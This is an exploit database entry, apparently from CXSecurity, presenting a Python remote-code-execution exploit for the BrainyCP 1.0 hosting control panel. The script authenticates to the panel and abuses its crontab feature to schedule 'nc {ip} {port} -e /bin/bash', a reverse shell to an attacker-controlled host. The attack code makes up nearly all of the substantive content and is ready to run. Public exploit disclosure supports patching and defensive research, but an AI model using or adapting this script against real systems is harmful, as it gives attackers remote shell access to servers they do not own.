---
title: BrainyCP 1.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023040051
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-12
fetch_date: 2025-10-04T11:29:13.394668
---

# BrainyCP 1.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **BrainyCP 1.0 Remote Code Execution** **2023-04-11 / 2023-04-12**  Credit:  **[Ahmet Umit Bayram](https://cxsecurity.com/author/Ahmet%2BUmit%2BBayram/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: BrainyCP V1.0 - Remote Code Execution
# Date: 2023-04-03
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://brainycp.io
# Demo: https://demo.brainycp.io
# Tested on: Kali Linux
# CVE : N/A
import requests
# credentials
url = input("URL: ")
username = input("Username: ")
password = input("Password: ")
ip = input("IP: ")
port = input("Port: ")
# login
session = requests.Session()
login\_url = f"{url}/auth.php"
login\_data = {"login": username, "password": password, "lan": "/"}
response = session.post(login\_url, data=login\_data)
if "Sign In" in response.text:
print("[-] Wrong credentials or may the system patched.")
exit()
# reverse shell
reverse\_shell = f"nc {ip} {port} -e /bin/bash"
# request
add\_cron\_url = f"{url}/index.php?do=crontab&subdo=ajax&subaction=addcron"
add\_cron\_data = {
"cron\_freq\_minutes": "\*",
"cron\_freq\_minutes\_own": "",
"cron\_freq\_hours": "\*",
"cron\_freq\_hours\_own": "",
"cron\_freq\_days": "\*",
"cron\_freq\_days\_own": "",
"cron\_freq\_months": "\*",
"cron\_freq\_weekdays": "\*",
"cron\_command": reverse\_shell,
"cron\_user": username,
}
response = session.post(add\_cron\_url, data=add\_cron\_data)
print("[+] Check your listener!")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040051)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top